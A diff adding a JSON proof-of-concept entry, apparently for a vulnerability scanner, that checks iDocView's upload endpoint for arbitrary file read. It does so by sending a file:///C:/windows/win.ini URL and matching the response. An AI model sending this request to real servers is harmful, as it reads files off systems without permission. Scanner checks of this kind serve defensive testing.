@@ -1,0 +1,14 @@
+{
+	"name":"iDocViewupload接口任意文件读取",
+	"tag":"iDocView",
+	"type":"other",
+	"poc":{
+		"pocGet":"/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name=test.txt",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"(txt)"
+	}
+}
